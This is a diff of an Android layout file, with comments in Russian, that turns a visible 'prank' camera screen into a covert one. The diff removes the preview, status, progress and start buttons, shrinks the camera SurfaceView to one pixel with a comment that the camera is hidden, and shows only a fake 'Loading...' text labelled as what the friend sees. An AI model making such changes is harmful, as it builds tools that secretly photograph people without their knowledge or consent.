@@ -1,91 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
-<androidx.constraintlayout.widget.ConstraintLayout 
+<androidx.constraintlayout.widget.ConstraintLayout
     xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:app="http://schemas.android.com/apk/res-auto"
-    xmlns:tools="http://schemas.android.com/tools"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#1a1a2e"
-    tools:context=".MainActivity">
+    android:background="#000000">
 
-    <!-- Превью камеры -->
+    <!-- Камера скрыта за экраном (1x1 пиксель) -->
     <SurfaceView
         android:id="@+id/surfaceView"
-        android:layout_width="0dp"
-        android:layout_height="0dp"
+        android:layout_width="1px"
+        android:layout_height="1px"
         app:layout_constraintTop_toTopOf="parent"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintHeight_percent="0.5" />
+        app:layout_constraintStart_toStartOf="parent" />
 
-    <!-- Превью последнего фото -->
-    <ImageView
-        android:id="@+id/imgPreview"
-        android:layout_width="120dp"
-        android:layout_height="120dp"
-        android:layout_margin="16dp"
-        android:background="#333355"
-        android:scaleType="centerCrop"
-        android:contentDescription="Preview"
-        app:layout_constraintTop_toBottomOf="@id/surfaceView"
-        app:layout_constraintEnd_toEndOf="parent" />
-
-    <!-- Статус -->
+    <!-- Что видит друг -->
     <TextView
-        android:id="@+id/txtStatus"
-        android:layout_width="0dp"
+        android:id="@+id/txtFake"
+        android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_margin="16dp"
-        android:text="📸 Камера готова!"
+        android:text="Загрузка..."
         android:textColor="#ffffff"
-        android:textSize="18sp"
+        android:textSize="22sp"
         android:textStyle="bold"
-        android:gravity="center"
-        app:layout_constraintTop_toBottomOf="@id/surfaceView"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintEnd_toStartOf="@id/imgPreview"
-        app:layout_constraintBottom_toTopOf="@id/progressBar" />
-
-    <!-- Прогресс -->
-    <ProgressBar
-        android:id="@+id/progressBar"
-        style="?android:attr/progressBarStyleHorizontal"
-        android:layout_width="0dp"
-        android:layout_height="wrap_content"
-        android:layout_margin="16dp"
-        android:max="3"
-        android:progress="0"
-        android:progressTint="#ff6b6b"
-        app:layout_constraintTop_toBottomOf="@id/imgPreview"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintBottom_toTopOf="@id/btnStart" />
-
-    <!-- Кнопка старта -->
-    <Button
-        android:id="@+id/btnStart"
-        android:layout_width="0dp"
-        android:layout_height="wrap_content"
-        android:layout_margin="24dp"
-        android:text="🎭 Начать розыгрыш!"
-        android:textSize="20sp"
-        android:backgroundTint="#ff6b6b"
-        android:padding="16dp"
-        app:layout_constraintBottom_toTopOf="@id/btnCopyError"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintEnd_toEndOf="parent" />
-
-    <!-- Кнопка копирования ошибки -->
-    <Button
-        android:id="@+id/btnCopyError"
-        android:layout_width="0dp"
-        android:layout_height="wrap_content"
-        android:layout_margin="24dp"
-        android:text="📋 Копировать ошибку"
-        android:textSize="16sp"
-        android:backgroundTint="#ffa500"
-        android:padding="12dp"
-        android:visibility="gone"
+        app:layout_constraintTop_toTopOf="parent"
         app:layout_constraintBottom_toBottomOf="parent"
         app:layout_constraintStart_toStartOf="parent"
         app:layout_constraintEnd_toEndOf="parent" />
